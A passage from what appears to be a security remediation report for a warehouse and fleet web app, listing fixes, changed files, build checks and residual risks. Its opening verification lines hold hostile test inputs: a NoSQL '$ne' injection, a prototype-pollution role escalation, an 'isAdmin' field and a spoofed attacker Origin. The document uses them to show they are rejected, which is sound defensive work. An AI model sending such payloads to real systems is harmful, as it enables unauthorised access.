POST /api/Warehouse  {"Bulkysecsize":-9999}                    400  (was accepted)
POST /api/Warehouse  {"$ne":"x"}                               400  (was accepted)
POST /api/Warehouse  {"__proto__":{"role":"Business Owner"}}   400  (was accepted)
POST /api/Warehouse  {"isAdmin":true}                          400  (was accepted)
POST /api/Warehouse  Description of 6000 chars                 400  (was accepted)
```

### V-14 — Unrestricted CORS — FIXED
`app.use(cors())` replaced with an allowlist driven by `CLIENT_ORIGINS`
(defaults to the two local dev origins).

```
Origin: https://attacker.example  -> no Access-Control-Allow-Origin header
Origin: http://localhost:5173     -> Access-Control-Allow-Origin: http://localhost:5173
```

### V-15 — Hardcoded base URL, plaintext HTTP — FIXED
New `frontend/src/utils/apiClient.js` reads `VITE_API_BASE_URL` and holds the
single shared axios instance. The inline `axios.create(...)` + two duplicated
interceptor blocks were removed from **14** Warehouse/Fleet files. All calls now
go through the shared client, which also sets `withCredentials` so the httpOnly
cookie is sent. A `.env.example` was added documenting `VITE_GOOGLE_MAPS_API_KEY`
referrer restriction. Residual note: the dev URL is still `http://`; production
must be served over HTTPS (HSTS is now emitted by helmet).

### V-16 — Missing security headers, open static mount — FIXED
`helmet()` installed with an explicit CSP (`frame-ancestors 'none'`,
`object-src 'none'`, `script-src 'self'`). `x-powered-by` removed.
`/uploads` is no longer a bare `express.static` mounted before the auth chain —
it is now behind `authenticateToken` with `dotfiles: "deny"`, `index: false`
and its own rate limit.

```
Content-Security-Policy: default-src 'self'; ... frame-ancestors 'none'; object-src 'none'; script-src 'self'
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Referrer-Policy: no-referrer
X-DNS-Prefetch-Control: off
```

### V-17 — PII in logs — FIXED
`console.log("Brief Staff Details Fetched:", staffDetails)` removed.
`getAllWarehouses()` switched to `.lean()` so it no longer materialises full
Mongoose documents just to be logged. The mislabelled
`console.log("new warehouse id", warehouseIds)` — which logged the *existing*
IDs — was deleted along with the dead code around it.

### V-18 — Insecure randomness — FIXED
`utils/password.ts` now uses `crypto.randomInt` with rejection sampling over a
reduced-alphabet (visually unambiguous) charset, guarantees at least one
character from each of the 4 classes, Fisher-Yates shuffles with the CSPRNG, and
defaults to 16 characters.

```
sample : r2aT@opG#CemF#ZJ
length : 16
all 4 character classes present: true
distinct first chars over 2000 runs: 65   (65 possible -> perfectly uniform)
generatePassword(8) -> throws "must be at least 12 characters"
```

### V-19 — Browser-only validation — FIXED
`vehicleValidations.jsx` rewritten: the NIC pattern now matches the message
(12–14 digits + optional `v`; the old code accepted 14 but claimed 15), the
email regex was replaced with `/^[^\s@]+@[^\s@]+\.[A-Za-z]{2,}$/` (the old
`\.{2,4}$` rejected valid long TLDs), and every validator is null-guarded so it
cannot throw on `undefined`. A header comment states these are UX-only and that
`backend/src/middleware/validation.ts` is authoritative. The same NIC and email
rules are now enforced in the zod layer.

### V-20 — Duplicate mounts, dead imports — FIXED
Removed the triple `/returns` mount and the duplicate `/dashboard` mount, the
unused `authenticateToken, authorizeRole` import in `login.ts`, and the unused
`Warehouse` schema import in `WarehouseAPI.ts`. Removed a dead
`getUserByName` export and the unused `getUserByEmail` / `createUser` helpers in
`VehicleApp.ts` after confirming no caller.

### V-21 — Deletes guarded only by `window.confirm` — FIXED
Hard deletes replaced with **soft deletes** on both warehouses and vehicles
(`deletedAt`, `deletedBy`), with `deletedAt: null` added to every read query.
Restore endpoints were added (`POST /api/Warehouse/:id/restore`,
`POST /api/vehicles/:id/restore`). A new `AuditLogSchema` records every
create / update / delete / restore / login attempt with actor id, actor role,
outcome and IP, retained for one year via a TTL index. Audit writes are
wrapped so a logging failure can never break the request.

## New Files

| File | Purpose |
|---|---|
| `backend/src/middleware/validation.ts` | zod request validation + Mongo operator / prototype-pollution rejection (V-13, V-05, V-10) |
| `backend/src/Infrastructure/schemas/AuditLogSchema.ts` | Immutable audit trail with 1-year TTL (V-21) |
| `backend/.env.example` | Documents required env vars; no secrets (V-04) |
| `frontend/.env.example` | Documents `VITE_API_BASE_URL` and Maps key (V-15) |
| `frontend/src/utils/apiClient.js` | Single shared axios client on the env var (V-15, V-06) |

## Dependencies Added

`helmet`, `express-rate-limit`, `cookie-parser`, `zod` (+ `@types/cookie-parser`).

## Files Changed

**Backend (16):** `index.ts`, `middleware/authentication.ts`, `middleware/validation.ts`,
`utils/jwt.ts`, `utils/password.ts`, `types/express.d.ts`, `seed.ts`,
`Application/login/login.ts`, `Application/WarehouseManagement/Warehouseapp.ts`,
`Application/VehicleFleet/VehicleApp.ts`,
`Application/VehicleFleet/VehicleMaintenenaceApp.ts`,
`API/WarehouseManagement/WarehouseAPI.ts`, `API/VehicleFleet/VehiclefleetAPI.ts`,
`API/VehicleFleet/VehicleMaintenanceAPI.ts`,
`Infrastructure/schemas/WarehouseManagement/Warehouseschema.ts`,
`Infrastructure/schemas/VehiclefleetSchemas/VehiclesSchema.ts`,
`Infrastructure/schemas/VehiclefleetSchemas/MaintenenceSchema.ts`

**Frontend (16):** deleted `App.jsx`; `component/ProtectedRoute.jsx`,
`utils/apiClient.js`, `pages/VehicleFleet/vehicleValidations.jsx`, and 13
Warehouse / Vehicle Fleet page files.

## Build & Quality Gates

| Check | Result |
|---|---|
| `backend` `tsc --noEmit` | **PASS** — 0 errors |
| `frontend` `npm run build` (vite) | **PASS** — built in 4.15s |
| `frontend` eslint, Warehouse + Vehicle Fleet scope | 11 problems — **identical to the pre-change baseline**; all verified pre-existing via `git stash` |
| `frontend` eslint, repo-wide | 48 problems → **44 problems** (net −4) |

No new lint errors were introduced. The residual errors in this module are
pre-existing functional bugs unrelated to security and were deliberately left
alone per the "do not fix styling / non-security issues" instruction:
- `Report.jsx` — `startX` / `currentX` used outside their declaring block (6×)
- `MaintenanceProfile.jsx` — `handleEdit` is not defined
- `VehicleProfile.jsx` — unused `key` parameter
- `CreateWarehouse.jsx` / `WarehouseProfile.jsx` — unused `response` variable

## Residual Risks and Follow-up

1. **The `PORT`, `MONGO_URI`, Cloudinary and Nodemailer placeholders remain**, as
   instructed — they are the agreed fixed values for this project.
2. **The Atlas credential in `backend/.env` is still the one that was shared in
   plaintext.** It must be rotated in Atlas; that is an Atlas console action, not
   a code change. All other outstanding tokens signed with the old secret are
   already invalid because the secret changed.
3. **The six seeded accounts still use `Password123!`.** This is the team's
   documented demo credential, and `seed.ts` now carries a warning plus a
   `NODE_ENV=production` console warning. Rotate before any real deployment.
4. **`httpOnly` cookie migration is opt-in.** The token is still returned in the
   login response body and still stored in `localStorage` by the remaining
   modules (Inventory, Staff, Delivery, Supplier, Return & Damage), which are
   owned by other team members. The server accepts **both** cookie and header, so
   each module can drop `localStorage` independently without a coordinated
   release. Full removal of the `localStorage` copy requires those modules to be
   updated.
5. **`/api/Warehouse` and `/api/maintenance` are mounted case-insensitively by
   Express**, and the Warehouse maintenance-request form
   (`CreateMaintenance.jsx`) posts a completely different payload shape to the
   same `/api/maintenance` endpoint used by vehicle maintenance. That collision
   is a pre-existing design flaw, not a security issue, and was left unchanged.
6. **No automated test suite exists** in this project. A regression test
   asserting that every route under `/api/warehouse` and `/api/vehicles` is
   registered with an authorisation policy would prevent V-01/V-02 recurring.
